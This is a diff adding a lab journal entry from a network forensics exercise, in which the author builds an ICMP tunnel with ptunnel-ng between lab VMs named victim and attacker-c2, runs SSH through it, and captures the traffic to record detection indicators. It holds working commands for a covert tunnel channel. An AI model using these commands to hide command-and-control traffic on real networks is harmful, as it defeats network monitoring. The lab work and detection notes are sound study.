@@ -28,3 +28,26 @@ RAM usage at 89%, with Microsoft Edge (35 tabs) consuming ~440MB. Likely
 cause: host resource exhaustion from running two VMs simultaneously
 alongside many browser tabs and VS Code. Resolved by resetting both VMs via
 VirtualBox (Machine > Reset) after closing unnecessary host applications.
+
+## 2026-11-20
+
+Resumed Lab 1 after a one-week break. Verified network connectivity
+(ping victim -> attacker-c2, 0% packet loss) before proceeding.
+Re-established the ICMP tunnel: server on attacker-c2
+(./src/ptunnel-ng -r0.0.0.0 -R22), client on victim
+(./src/ptunnel-ng -p 192.168.100.20 -l 2222 -r192.168.100.20 -R22).
+
+Started Wireshark capture on victim (enp0s3), then generated tunnel
+traffic via `ssh -p 2222 attacker-c2@127.0.0.1` (ran whoami, pwd,
+uname -a, ls -la, then exit). SSH session succeeded without issues this
+time. Captured traffic shows a continuous stream of ICMP Echo
+request/reply between 192.168.100.10 and 192.168.100.20 with the same
+id but variable packet length (70-246 bytes) - a key indicator that the
+ICMP traffic is carrying tunneled data rather than being a normal ping.
+
+Stopped the capture and saved the file as LAB1_Network_Evidence.pcapng
+on victim's Desktop. Calculated its SHA-256 hash:
+a3c7a8fed09b3db88984655271fa61782e22ca7cf2ad1c025e085c1c26bdeac6
+
+Evidence file still needs to be transferred from victim to the
+repository (lab1/evidence/).
